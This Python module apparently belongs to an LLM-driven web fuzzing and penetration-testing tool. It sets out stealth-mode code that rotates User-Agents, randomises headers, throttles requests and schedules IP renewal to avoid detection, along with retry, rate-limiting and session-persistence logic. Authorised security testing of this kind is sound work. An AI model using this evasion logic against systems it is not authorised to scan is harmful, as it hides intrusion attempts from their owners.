"""
Agentic Fuzzer Service

LLM-driven autonomous fuzzing system that intelligently analyzes results,
decides on next steps, and iterates through techniques to find vulnerabilities.

Features:
- Intelligent LLM-driven decision making
- Response fingerprinting and tech stack detection
- WAF/IDS detection and evasion
- Adaptive payload mutation
- CVSS scoring for findings
- Proof-of-concept generation
- Chain-of-thought attack reasoning
- Chained/Multi-step attack orchestration
- Blind vulnerability detection (time-based, OOB callbacks)
- Auto-discovery of endpoints and parameters
- Retry logic with exponential backoff and circuit breaker
- Adaptive rate limiting with token bucket algorithm
- Session persistence for save/resume capability
"""

import asyncio
import json
import logging
import random
import re
import uuid
import base64
import urllib.parse
import hashlib
import time
import os
import aiohttp
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, AsyncGenerator, Tuple, Set
from dataclasses import dataclass, field, asdict
from enum import Enum
from html.parser import HTMLParser
import httpx

# Initialize logger early so it's available for import exception handlers
logger = logging.getLogger(__name__)

from backend.core.config import settings

# Import wordlist service for comprehensive payloads
try:
    from backend.services.wordlist_service import (
        get_wordlist_service,
        WordlistCategory,
        get_payloads as get_wordlist_payloads
    )
    WORDLIST_SERVICE_AVAILABLE = True
except ImportError:
    WORDLIST_SERVICE_AVAILABLE = False

# Import OOB callback service for blind vulnerability detection
try:
    from backend.services.oob_callback_service import (
        OOBCallbackManager,
        OOBPayloadGenerator,
        VulnerabilityType,
        get_callback_store,
        create_callback_manager,
        create_payload_generator,
    )
    OOB_SERVICE_AVAILABLE = True
except ImportError:
    OOB_SERVICE_AVAILABLE = False

# Import OpenAPI parser for spec-driven fuzzing
try:
    from backend.services.openapi_parser_service import (
        OpenAPIParser,
        ParsedAPISpec,
        parse_openapi_content,
        parse_openapi_url,
        discover_openapi_spec,
    )
    OPENAPI_SERVICE_AVAILABLE = True
except ImportError:
    OPENAPI_SERVICE_AVAILABLE = False

# Import JWT attack service for JWT security testing
try:
    from backend.services.jwt_attack_service import (
        scan_jwt,
        analyze_jwt_token,
        forge_jwt_token,
        JWTAttackType,
        COMMON_JWT_SECRETS,
    )
    JWT_SERVICE_AVAILABLE = True
except ImportError:
    JWT_SERVICE_AVAILABLE = False

# Import HTTP smuggling service for request smuggling detection
try:
    from backend.services.http_smuggling_service import (
        HTTPSmugglingDetector,
        SmugglingTechnique,
        scan_for_smuggling,
    )
    HTTP_SMUGGLING_SERVICE_AVAILABLE = True
except ImportError:
    HTTP_SMUGGLING_SERVICE_AVAILABLE = False

# Import race condition service for TOCTOU/race detection
try:
    from backend.services.race_condition_service import (
        RaceConditionDetector,
        RaceConditionType,
        scan_for_race_conditions,
    )
    RACE_CONDITION_SERVICE_AVAILABLE = True
except ImportError as e:
    logger.warning(f"Race condition service not available: {e}")
    RACE_CONDITION_SERVICE_AVAILABLE = False

# Import multi-model reasoning engine for enhanced AI analysis
try:
    from backend.services.multi_model_reasoning import (
        MultiModelReasoningEngine,
        ModelRole,
        get_reasoning_engine,
        configure_reasoning_engine,
    )
    MULTI_MODEL_REASONING_AVAILABLE = True
except ImportError:
    MULTI_MODEL_REASONING_AVAILABLE = False

# Import vulnerability correlation engine for attack chain discovery
try:
    from backend.services.vulnerability_correlation_engine import (
        VulnerabilityCorrelationEngine,
        CorrelationType,
        get_correlation_engine,
        analyze_findings,
    )
    CORRELATION_ENGINE_AVAILABLE = True
except ImportError:
    CORRELATION_ENGINE_AVAILABLE = False

# Import passive scanner for response analysis
try:
    from backend.services.passive_scanner_service import (
        PassiveScanner,
        PassiveFinding,
        PassiveFindingSeverity,
        PassiveFindingType,
        get_passive_scanner,
    )
    PASSIVE_SCANNER_AVAILABLE = True
except ImportError:
    PASSIVE_SCANNER_AVAILABLE = False

# Import finding validator for context-aware deduplication and FP filtering
try:
    from backend.services.finding_validator_service import (
        FindingValidatorService,
        TargetContext,
        finding_validator,
    )
    FINDING_VALIDATOR_AVAILABLE = True
except ImportError:
    FINDING_VALIDATOR_AVAILABLE = False

# Import response diffing engine for anomaly detection
try:
    from backend.services.response_diffing_engine import (
        ResponseDiffingEngine,
        ResponseFingerprint,
        DiffResult,
        AnomalyResult,
        AnomalyType,
        get_diffing_engine,
    )
    DIFFING_ENGINE_AVAILABLE = True
except ImportError:
    DIFFING_ENGINE_AVAILABLE = False

# Import payload mutation engine for WAF evasion
try:
    from backend.services.payload_mutation_engine import (
        PayloadMutationEngine,
        MutationCategory,
        MutationResult,
        MutationFeedback,
        PayloadContext,
        get_mutation_engine,
    )
    MUTATION_ENGINE_AVAILABLE = True
except ImportError:
    MUTATION_ENGINE_AVAILABLE = False

# Import advanced authentication handler
try:
    from backend.services.advanced_auth_handler import (
        AdvancedAuthManager,
        AuthConfig as AdvancedAuthConfig,
        AuthFlowType,
        TokenInfo,
        PKCEChallenge,
        get_auth_manager,
    )
    ADVANCED_AUTH_AVAILABLE = True
except ImportError:
    ADVANCED_AUTH_AVAILABLE = False

# Import scan profiles service for predefined scan configurations
try:
    from backend.services.scan_profiles_service import (
        ScanProfile,
        ScanProfileType,
        ScanProfileManager,
        RiskLevel,
        ScanSpeed,
        TechniqueCategory,
        get_profile,
        list_profiles,
        get_recommended_profile,
        create_custom_profile,
    )
    SCAN_PROFILES_AVAILABLE = True
except ImportError:
    SCAN_PROFILES_AVAILABLE = False

# Import intelligent crawler for endpoint discovery
try:
    from backend.services.intelligent_crawler_service import (
        IntelligentCrawler,
        CrawlConfig,
        CrawledEndpoint,
        SiteMap,
        SecurityInterest,
        EndpointType,
        crawl_target,
        get_high_value_endpoints,
        get_attack_surface_summary,
        prioritize_endpoints_for_testing,
    )
    INTELLIGENT_CRAWLER_AVAILABLE = True
except ImportError:
    INTELLIGENT_CRAWLER_AVAILABLE = False

# Import ETA estimation service for scan duration tracking
try:
    from backend.services.scan_eta_service import (
        ScanETAService,
        ScanETA,
        ETAConfidence,
        estimate_scan_duration,
        update_eta,
        complete_scan as complete_scan_eta,
        get_eta,
        get_eta_service,
    )
    ETA_SERVICE_AVAILABLE = True
except ImportError:
    ETA_SERVICE_AVAILABLE = False


# =============================================================================
# STEALTH MODE CONFIGURATION
# =============================================================================

# Common User-Agent strings for rotation (mimics real browsers)
STEALTH_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

# Random headers to vary fingerprint
STEALTH_EXTRA_HEADERS = [
    {"Accept-Language": "en-US,en;q=0.9"},
    {"Accept-Language": "en-GB,en;q=0.9"},
    {"Accept-Language": "en-US,en;q=0.9,es;q=0.8"},
    {"Accept-Encoding": "gzip, deflate, br"},
    {"Accept-Encoding": "gzip, deflate"},
    {"Cache-Control": "no-cache"},
    {"Cache-Control": "max-age=0"},
    {"Pragma": "no-cache"},
    {"DNT": "1"},
    {"Upgrade-Insecure-Requests": "1"},
]

# Global stealth session state (for tracking request counts across the session)
_stealth_session_state: Dict[str, Dict[str, Any]] = {}


async def apply_stealth_delay(session: 'AgenticFuzzingSession') -> Tuple[float, bool]:
    """
    Apply stealth mode delay before a request.
    Returns tuple of (delay_applied_seconds, ip_renewal_needed).
    Safe to call even if stealth attributes are missing.
    """
    try:
        if not getattr(session, 'stealth_mode_enabled', False):
            return 0.0, False
        
        # Increment request count (with safe default)
        session.stealth_request_count = getattr(session, 'stealth_request_count', 0) + 1
        
        # Check if IP renewal is needed
        ip_renewal_needed = False
        if getattr(session, 'stealth_ip_renewal_enabled', False):
            session.stealth_ip_renewal_count = getattr(session, 'stealth_ip_renewal_count', 0) + 1
            interval = getattr(session, 'stealth_ip_renewal_interval', 50)
            if interval > 0 and session.stealth_ip_renewal_count >= interval:
                ip_renewal_needed = True
                session.stealth_ip_renewal_pending = True
                logger.info(f"[Stealth] IP renewal needed after {session.stealth_ip_renewal_count} requests")
        
        # Get pause settings with safe defaults
        requests_before_pause = getattr(session, 'stealth_requests_before_pause', 10)
        pause_duration = getattr(session, 'stealth_pause_duration', 30.0)
        delay_min = getattr(session, 'stealth_delay_min', 2.0)
        delay_max = getattr(session, 'stealth_delay_max', 5.0)
        
        # Check if we need a longer pause (but not if IP renewal is pending)
        if not ip_renewal_needed and requests_before_pause > 0 and session.stealth_request_count % requests_before_pause == 0:
            logger.info(f"[Stealth] Taking pause after {session.stealth_request_count} requests ({pause_duration}s)")
            await asyncio.sleep(pause_duration)
            return pause_duration, False
        
        # Apply random delay between min and max
        delay = random.uniform(delay_min, delay_max)
        await asyncio.sleep(delay)
        return delay, ip_renewal_needed
    except Exception as e:
        logger.warning(f"[Stealth] apply_stealth_delay failed (non-fatal): {e}")
        return 0.0, False


def reset_ip_renewal_counter(session: 'AgenticFuzzingSession'):
    """Reset the IP renewal counter after renewal is confirmed. Safe to call even if attributes missing."""
    try:
        session.stealth_ip_renewal_count = 0
        session.stealth_ip_renewal_pending = False
        session.stealth_ip_renewals_done = getattr(session, 'stealth_ip_renewals_done', 0) + 1
        logger.info(f"[Stealth] IP renewal #{session.stealth_ip_renewals_done} confirmed, counter reset")
    except Exception as e:
        logger.warning(f"[Stealth] reset_ip_renewal_counter failed (non-fatal): {e}")


def get_stealth_headers(session: 'AgenticFuzzingSession', base_headers: Dict[str, str]) -> Dict[str, str]:
    """
    Get headers with stealth modifications applied.
    Randomizes User-Agent and adds extra headers to vary fingerprint.
    """
    if not session.stealth_mode_enabled:
        return base_headers
    
    headers = dict(base_headers)
    
    # Randomize User-Agent
    if session.stealth_randomize_user_agent:
        headers["User-Agent"] = random.choice(STEALTH_USER_AGENTS)
    
    # Add random extra headers
    if session.stealth_randomize_headers:
        extra = random.choice(STEALTH_EXTRA_HEADERS)
        for key, value in extra.items():
            if key not in headers:  # Don't override existing headers
                headers[key] = value
    
    return headers


# =============================================================================
# RETRY LOGIC & CIRCUIT BREAKER
# =============================================================================

@dataclass
class RetryConfig:
    """Configuration for retry behavior."""
    max_retries: int = 3
    base_delay: float = 1.0  # seconds
    max_delay: float = 30.0  # seconds
    exponential_base: float = 2.0
    jitter: bool = True  # Add randomness to prevent thundering herd
    retry_on_status: Set[int] = field(default_factory=lambda: {429, 500, 502, 503, 504})
    retry_on_exceptions: Tuple = field(default_factory=lambda: (
        httpx.TimeoutException,
        httpx.ConnectError,
        httpx.ReadError,
        ConnectionError,
    ))


@dataclass
class CircuitBreaker:
    """Circuit breaker for failing services."""
    failure_threshold: int = 5
    recovery_timeout: float = 60.0  # seconds
    half_open_max_calls: int = 3
    
    _failure_count: int = field(default=0, repr=False)
    _last_failure_time: float = field(default=0.0, repr=False)
    _state: str = field(default="closed", repr=False)  # closed, open, half_open
    _half_open_calls: int = field(default=0, repr=False)
    
    def record_success(self):
        """Record a successful call."""
        if self._state == "half_open":
            self._half_open_calls -= 1
            if self._half_open_calls <= 0:
                self._state = "closed"
                self._failure_count = 0
                logger.info("Circuit breaker closed - service recovered")
        elif self._state == "closed":
            self._failure_count = max(0, self._failure_count - 1)
    
    def record_failure(self):
        """Record a failed call."""
        self._failure_count += 1
        self._last_failure_time = time.time()
        
        if self._state == "half_open":
            self._state = "open"
            logger.warning("Circuit breaker re-opened - service still failing")
        elif self._failure_count >= self.failure_threshold:
            self._state = "open"
            logger.warning(f"Circuit breaker opened after {self._failure_count} failures")
    
    def can_execute(self) -> bool:
        """Check if a call can be made."""
        if self._state == "closed":
            return True
        
        if self._state == "open":
            # Check if recovery timeout has passed
            if time.time() - self._last_failure_time >= self.recovery_timeout:
                self._state = "half_open"
                self._half_open_calls = self.half_open_max_calls
                logger.info("Circuit breaker half-open - testing service")
                return True
            return False
        
        # half_open state
        return self._half_open_calls > 0
    
    def get_state(self) -> Dict[str, Any]:
        """Get current circuit breaker state."""
        return {
            "state": self._state,
            "failure_count": self._failure_count,
            "last_failure": self._last_failure_time,
            "can_execute": self.can_execute(),
        }


async def retry_with_backoff(
    func,
    *args,
    config: RetryConfig = None,
    circuit_breaker: CircuitBreaker = None,
    **kwargs
) -> Any:
    """Execute a function with retry logic and exponential backoff."""
    config = config or RetryConfig()
    last_exception = None
    
    for attempt in range(config.max_retries + 1):
        # Check circuit breaker
        if circuit_breaker and not circuit_breaker.can_execute():
            raise Exception(f"Circuit breaker open - service unavailable")
        
        try:
            result = await func(*args, **kwargs)
            
            # Record success
            if circuit_breaker:
                circuit_breaker.record_success()
            
            return result
            
        except config.retry_on_exceptions as e:
            last_exception = e
            
            if circuit_breaker:
                circuit_breaker.record_failure()
            
            if attempt < config.max_retries:
                delay = min(
                    config.base_delay * (config.exponential_base ** attempt),
                    config.max_delay
                )
                
                if config.jitter:
                    import random
                    delay = delay * (0.5 + random.random())
                
                logger.warning(
                    f"Retry attempt {attempt + 1}/{config.max_retries} after {delay:.2f}s: {e}"
                )
                await asyncio.sleep(delay)
            else:
                logger.error(f"All {config.max_retries} retries failed: {e}")
                raise
        
        except Exception as e:
            # Non-retryable exception
            if circuit_breaker:
                circuit_breaker.record_failure()
            raise
    
    raise last_exception


# =============================================================================
# ADAPTIVE RATE LIMITING
# =============================================================================

@dataclass
class RateLimiter:
    """Token bucket rate limiter with adaptive behavior."""
    requests_per_second: float = 10.0
    burst_size: int = 20
    adaptive: bool = True
    min_rate: float = 1.0
    max_rate: float = 50.0
    
    _tokens: float = field(default=0.0, repr=False)
    _last_update: float = field(default=0.0, repr=False)
    _consecutive_rate_limits: int = field(default=0, repr=False)
    _consecutive_successes: int = field(default=0, repr=False)
    
    def __post_init__(self):
        self._tokens = float(self.burst_size)
        self._last_update = time.time()
    
    def _refill_tokens(self):
        """Refill tokens based on time elapsed."""
        now = time.time()
        elapsed = now - self._last_update
        self._tokens = min(
            self.burst_size,
            self._tokens + elapsed * self.requests_per_second
        )
        self._last_update = now
    
    async def acquire(self, tokens: int = 1) -> float:
        """Acquire tokens, waiting if necessary. Returns wait time."""
        self._refill_tokens()
        
        if self._tokens >= tokens:
            self._tokens -= tokens
            return 0.0
        
        # Calculate wait time
        needed = tokens - self._tokens
        wait_time = needed / self.requests_per_second
        
        await asyncio.sleep(wait_time)
        self._refill_tokens()
        self._tokens -= tokens
        
        return wait_time
    
    def record_response(self, status_code: int, response_time_ms: float):
        """Adjust rate based on server response."""
        if not self.adaptive:
            return
        
        if status_code == 429:  # Rate limited
            self._consecutive_rate_limits += 1
            self._consecutive_successes = 0
            
            # Reduce rate exponentially on repeated rate limits
            reduction = 0.5 ** min(self._consecutive_rate_limits, 4)
            self.requests_per_second = max(
                self.min_rate,
                self.requests_per_second * reduction
            )
            logger.warning(
                f"Rate limit detected - reducing to {self.requests_per_second:.2f} req/s"
            )
            
        elif status_code in {500, 502, 503, 504}:
            # Server error - slow down slightly
            self._consecutive_successes = 0
            self.requests_per_second = max(
                self.min_rate,
                self.requests_per_second * 0.8
            )
            
        elif 200 <= status_code < 300:
            self._consecutive_rate_limits = 0
            self._consecutive_successes += 1
            
            # Gradually increase rate on successful responses
            if self._consecutive_successes >= 10:
                self.requests_per_second = min(
                    self.max_rate,
                    self.requests_per_second * 1.1
                )
                self._consecutive_successes = 0
        
        # Also adjust based on response time
        if response_time_ms > 5000:  # Slow response
            self.requests_per_second = max(
                self.min_rate,
                self.requests_per_second * 0.9
            )
    
    def get_stats(self) -> Dict[str, Any]:
        """Get rate limiter statistics."""
        return {
            "current_rate": self.requests_per_second,
            "tokens_available": self._tokens,
            "burst_size": self.burst_size,
            "consecutive_rate_limits": self._consecutive_rate_limits,
            "consecutive_successes": self._consecutive_successes,
        }


# =============================================================================
# SESSION PERSISTENCE
# =============================================================================

SESSIONS_DIR = Path("data/fuzzing_sessions")


def _ensure_sessions_dir():
    """Ensure the sessions directory exists."""
    SESSIONS_DIR.mkdir(parents=True, exist_ok=True)


def save_session(session: 'AgenticFuzzingSession') -> str:
    """Save a fuzzing session to disk."""
    _ensure_sessions_dir()
    
    session_data = session.to_dict()
    session_data["_saved_at"] = datetime.utcnow().isoformat()
    session_data["_version"] = "1.0"
    
    # Serialize to JSON
    filename = f"session_{session.id}.json"
    filepath = SESSIONS_DIR / filename
    
    with open(filepath, 'w') as f:
        json.dump(session_data, f, indent=2, default=str)
    
    logger.info(f"Session {session.id} saved to {filepath}")
    return str(filepath)


def load_session(session_id: str) -> Optional['AgenticFuzzingSession']:
    """Load a fuzzing session from disk."""
    _ensure_sessions_dir()
    
    filename = f"session_{session_id}.json"
    filepath = SESSIONS_DIR / filename
    
    if not filepath.exists():
        logger.warning(f"Session file not found: {filepath}")
        return None
    
    try:
        with open(filepath, 'r') as f:
            data = json.load(f)
        
        # Reconstruct session
        session = _deserialize_session(data)
        logger.info(f"Session {session_id} loaded from {filepath}")
        return session
        
    except Exception as e:
        logger.error(f"Failed to load session {session_id}: {e}")
        return None


def _deserialize_session(data: Dict[str, Any]) -> 'AgenticFuzzingSession':
    """Deserialize session data back into objects."""
    # Reconstruct targets
    targets = []
    for t in data.get("targets", []):
        fingerprint = None
        if t.get("fingerprint"):
            fp = t["fingerprint"]
            fingerprint = TechFingerprint(
                server=fp.get("server"),
                framework=fp.get("framework"),
                language=fp.get("language"),
                cms=fp.get("cms"),
                waf=WafType(fp.get("waf", "none")),
                waf_confidence=fp.get("waf_confidence", 0.0),
                technologies=fp.get("technologies", []),
            )
        
        targets.append(FuzzingTarget(
            url=t["url"],
            method=t.get("method", "GET"),
            headers=t.get("headers", {}),
            body=t.get("body"),
            parameters=t.get("parameters", []),
            discovered_params=t.get("discovered_params", []),
            fingerprint=fingerprint,
        ))
    
    # Reconstruct findings
    findings = []
    for f in data.get("findings", []):
        findings.append(FuzzingFinding(
            id=f["id"],
            technique=f["technique"],
            severity=f["severity"],
            title=f["title"],
            description=f["description"],
            payload=f["payload"],
            evidence=f.get("evidence", []),
            endpoint=f["endpoint"],
            parameter=f.get("parameter"),
            recommendation=f.get("recommendation", ""),
            confidence=f.get("confidence", 0.0),
            exploitable=f.get("exploitable", False),
            cvss_score=f.get("cvss_score", 0.0),
            cvss_vector=f.get("cvss_vector", ""),
            proof_of_concept=f.get("proof_of_concept", ""),
            remediation_priority=f.get("remediation_priority", "medium"),
            cwe_id=f.get("cwe_id"),
        ))
    
    # Reconstruct discovered endpoints
    discovered_endpoints = []
    for e in data.get("discovered_endpoints", []):
        discovered_endpoints.append(DiscoveredEndpoint(
            url=e["url"],
            method=e.get("method", "GET"),
            parameters=e.get("parameters", []),
            source=e.get("source", "unknown"),
            confidence=e.get("confidence", 1.0),
        ))
    
    # Reconstruct attack chains
    attack_chains = []
    for c in data.get("attack_chains", []):
        steps = [
            AttackChainStep(
                order=s["order"],
                technique=s["technique"],
                payload=s["payload"],
                expected_outcome=s["expected_outcome"],
                actual_outcome=s.get("actual_outcome"),
                success=s.get("success", False),
                data_extracted=s.get("data_extracted"),
            )
            for s in c.get("steps", [])
        ]
        attack_chains.append(AttackChain(
            id=c["id"],
            name=c["name"],
            description=c["description"],
            steps=steps,
            current_step=c.get("current_step", 0),
            status=c.get("status", "pending"),
            final_impact=c.get("final_impact", ""),
        ))
    
    # Reconstruct blind detection results
    blind_results = []
    for r in data.get("blind_detection_results", []):
        blind_results.append(BlindDetectionResult(
            technique=r["technique"],
            detected=r["detected"],
            detection_method=r["detection_method"],
            baseline_time=r.get("baseline_time", 0.0),
            payload_time=r.get("payload_time", 0.0),
            time_difference=r.get("time_difference", 0.0),
            callback_received=r.get("callback_received", False),
            callback_data=r.get("callback_data"),
            confidence=r.get("confidence", 0.0),
        ))
    
    # Create session
    session = AgenticFuzzingSession(
        id=data["id"],
        targets=targets,
        current_phase=FuzzingPhase(data.get("current_phase", "reconnaissance")),
        current_target_index=data.get("current_target_index", 0),
        current_technique=FuzzingTechnique(data["current_technique"]) if data.get("current_technique") else None,
        techniques_tried=data.get("techniques_tried", {}),
        findings=findings,
        iterations=data.get("iterations", 0),
        max_iterations=data.get("max_iterations", 50),
        llm_decisions=data.get("llm_decisions", []),
        fuzzing_history=data.get("fuzzing_history", []),
        started_at=data.get("started_at", datetime.utcnow().isoformat()),
        completed_at=data.get("completed_at"),
        status=data.get("status", "running"),
        error=data.get("error"),
        discovered_endpoints=discovered_endpoints,
        attack_chains=attack_chains,
        blind_detection_results=blind_results,
        callback_token=data.get("callback_token", uuid.uuid4().hex[:16]),
        baseline_response_time=data.get("baseline_response_time", 0.0),
        auto_discovery_enabled=data.get("auto_discovery_enabled", True),
        chain_attacks_enabled=data.get("chain_attacks_enabled", True),
        blind_detection_enabled=data.get("blind_detection_enabled", True),
    )
    
    return session


def list_saved_sessions() -> List[Dict[str, Any]]:
    """List all saved sessions."""
    _ensure_sessions_dir()
    
    sessions = []
    for filepath in SESSIONS_DIR.glob("session_*.json"):
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
            sessions.append({
                "id": data.get("id"),
                "status": data.get("status"),
                "targets_count": len(data.get("targets", [])),
                "findings_count": len(data.get("findings", [])),
                "iterations": data.get("iterations", 0),
                "started_at": data.get("started_at"),
                "saved_at": data.get("_saved_at"),
                "filepath": str(filepath),
            })
        except Exception as e:
            logger.warning(f"Failed to read session file {filepath}: {e}")
    
    return sorted(sessions, key=lambda x: x.get("saved_at", ""), reverse=True)


def delete_saved_session(session_id: str) -> bool:
    """Delete a saved session file."""
    _ensure_sessions_dir()
    
    filename = f"session_{session_id}.json"
    filepath = SESSIONS_DIR / filename
    
    if filepath.exists():
        filepath.unlink()
        logger.info(f"Deleted session file: {filepath}")
        return True
    
    return False


# Global instances for robustness features
# Higher threshold for fuzzing - many requests naturally fail (404s, timeouts, etc.)
_rate_limiter = RateLimiter(requests_per_second=10.0, burst_size=20, adaptive=True)
_http_circuit_breaker = CircuitBreaker(failure_threshold=20, recovery_timeout=30.0)
_llm_circuit_breaker = CircuitBreaker(failure_threshold=5, recovery_timeout=60.0)
_retry_config = RetryConfig(max_retries=3, base_delay=1.0, max_delay=30.0)


# =============================================================================
# PER-DOMAIN CIRCUIT BREAKER MANAGER
# =============================================================================

class DomainCircuitBreakerManager:
    """Manages circuit breakers per domain to prevent one failing domain from affecting others."""
    
    def __init__(self, failure_threshold: int = 5, recovery_timeout: float = 60.0):
        self._breakers: Dict[str, CircuitBreaker] = {}
        self._failure_threshold = failure_threshold
        self._recovery_timeout = recovery_timeout
        self._lock = asyncio.Lock()
    
    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL."""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            return parsed.netloc or "unknown"
        except Exception:
            return "unknown"
    
    async def get_breaker(self, url: str) -> CircuitBreaker:
        """Get or create a circuit breaker for the given URL's domain."""
        domain = self._extract_domain(url)
        async with self._lock:
            if domain not in self._breakers:
                self._breakers[domain] = CircuitBreaker(
                    failure_threshold=self._failure_threshold,
                    recovery_timeout=self._recovery_timeout
                )
            return self._breakers[domain]
    
    def get_breaker_sync(self, url: str) -> CircuitBreaker:
        """Synchronous version for non-async contexts."""
        domain = self._extract_domain(url)
        if domain not in self._breakers:
            self._breakers[domain] = CircuitBreaker(
                failure_threshold=self._failure_threshold,
                recovery_timeout=self._recovery_timeout
            )
        return self._breakers[domain]
    
    def get_all_states(self) -> Dict[str, Dict[str, Any]]:
        """Get state of all circuit breakers."""
        return {domain: breaker.get_state() for domain, breaker in self._breakers.items()}
    
    def reset_all(self):
        """Reset all circuit breakers."""
        self._breakers.clear()


# Global per-domain circuit breaker manager - higher threshold for fuzzing scenarios
_domain_circuit_breakers = DomainCircuitBreakerManager(failure_threshold=20, recovery_timeout=30.0)


# =============================================================================
# MEMORY-BOUNDED COLLECTIONS
# =============================================================================

class BoundedList:
    """A list with a maximum size that evicts oldest entries when full."""
    
    def __init__(self, max_size: int = 1000):
        self._data: List[Any] = []
        self._max_size = max_size
        self._total_added = 0
        self._evicted_count = 0
    
    def append(self, item: Any):
        """Add an item, evicting oldest if at capacity."""
        self._data.append(item)
        self._total_added += 1
        if len(self._data) > self._max_size:
            self._data.pop(0)
            self._evicted_count += 1
    
    def extend(self, items: List[Any]):
        """Extend with multiple items."""
        for item in items:
            self.append(item)
    
    def __len__(self) -> int:
        return len(self._data)
    
    def __iter__(self):
        return iter(self._data)
    
    def __getitem__(self, key):
        return self._data[key]
    
    def to_list(self) -> List[Any]:
        """Convert to regular list."""
        return list(self._data)
    
    def get_stats(self) -> Dict[str, int]:
        """Get statistics about the bounded list."""
        return {
            "current_size": len(self._data),
            "max_size": self._max_size,
            "total_added": self._total_added,
            "evicted_count": self._evicted_count,
        }
    
    def clear(self):
        """Clear all items."""
        self._data.clear()


# =============================================================================
# ENHANCED PROGRESS TRACKING
# =============================================================================

@dataclass
class PhaseProgress:
    """Tracks progress within a scan phase."""
    name: str
    status: str = "pending"  # pending, in_progress, completed, skipped, error
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    current_step: int = 0
    total_steps: int = 0
    message: str = ""
    sub_phases: List[Dict[str, Any]] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        elapsed = 0
        if self.start_time:
            elapsed = (self.end_time or time.time()) - self.start_time
        return {
            "name": self.name,
            "status": self.status,
            "elapsed_seconds": round(elapsed, 1),
            "current_step": self.current_step,
            "total_steps": self.total_steps,
            "progress_percent": round((self.current_step / max(self.total_steps, 1)) * 100, 1),
            "message": self.message,
            "sub_phases": self.sub_phases,
        }


class ScanProgressTracker:
    """
    Comprehensive progress tracker for agentic fuzzer scans.
    Provides real-time phase tracking, ETA estimation, and detailed status.
    """
    
    # Define standard phases in order
    PHASES = [
        ("initialization", "Initializing scan", 1),
        ("fingerprinting", "Fingerprinting target", 2),
        ("profile_load", "Loading scan profile", 1),
        ("intelligent_crawl", "Crawling for endpoints", 5),
        ("reconnaissance", "Discovering endpoints & parameters", 10),
        ("technique_selection", "Selecting attack techniques", 2),
        ("fuzzing", "Executing fuzzing attacks", 50),
        ("blind_detection", "Checking blind vulnerabilities", 5),
        ("chain_exploitation", "Building attack chains", 10),
        ("http_smuggling", "Testing HTTP smuggling", 5),
        ("race_conditions", "Testing race conditions", 5),
        ("jwt_attacks", "Testing JWT security", 3),
        ("reporting", "Generating final report", 1),
    ]
    
    def __init__(self, scan_id: str, max_iterations: int = 50):
        self.scan_id = scan_id
        self.max_iterations = max_iterations
        self.start_time = time.time()
        self.current_phase_index = 0
        self.current_iteration = 0
        
        # Initialize all phases
        self.phases: Dict[str, PhaseProgress] = {}
        total_weight = sum(p[2] for p in self.PHASES)
        cumulative = 0
        for name, desc, weight in self.PHASES:
            self.phases[name] = PhaseProgress(
                name=name,
                message=desc,
                total_steps=weight,
            )
            cumulative += weight
        
        self.total_weight = total_weight
        
        # Tracking metrics
        self.requests_made = 0
        self.findings_count = 0
        self.endpoints_discovered = 0
        self.techniques_tested: Set[str] = set()
        self.errors: List[str] = []
        self.warnings: List[str] = []
        
        # Activity tracking
        self.last_activity_time = time.time()
        self.activity_log: List[Dict[str, Any]] = []
        
    def start_phase(self, phase_name: str, message: str = "", total_steps: int = 0):
        """Start a new phase."""
        if phase_name not in self.phases:
            # Dynamic phase - add it
            self.phases[phase_name] = PhaseProgress(
                name=phase_name,
                message=message or phase_name.replace("_", " ").title(),
                total_steps=total_steps or 1,
            )
        
        phase = self.phases[phase_name]
        phase.status = "in_progress"
        phase.start_time = time.time()
        phase.message = message or phase.message
        if total_steps:
            phase.total_steps = total_steps
        
        self.last_activity_time = time.time()
        self._log_activity(f"Started phase: {phase_name}")
        
        # Update phase index
        for i, (name, _, _) in enumerate(self.PHASES):
            if name == phase_name:
                self.current_phase_index = i
                break
    
    def update_phase(self, phase_name: str, step: int = None, message: str = None, increment: bool = False):
        """Update progress within a phase."""
        if phase_name not in self.phases:
            return
        
        phase = self.phases[phase_name]
        if step is not None:
            phase.current_step = step
        elif increment:
            phase.current_step += 1
        
        if message:
            phase.message = message
        
        self.last_activity_time = time.time()
    
    def complete_phase(self, phase_name: str, status: str = "completed", message: str = None):
        """Mark a phase as complete."""
        if phase_name not in self.phases:
            return
        
        phase = self.phases[phase_name]
        phase.status = status
        phase.end_time = time.time()
        phase.current_step = phase.total_steps
        if message:
            phase.message = message
        
        self._log_activity(f"Completed phase: {phase_name} ({status})")
    
    def add_sub_phase(self, phase_name: str, sub_name: str, status: str = "in_progress"):
        """Add a sub-phase to a phase."""
        if phase_name not in self.phases:
            return
        
        self.phases[phase_name].sub_phases.append({
            "name": sub_name,
            "status": status,
            "timestamp": datetime.utcnow().isoformat(),
        })
    
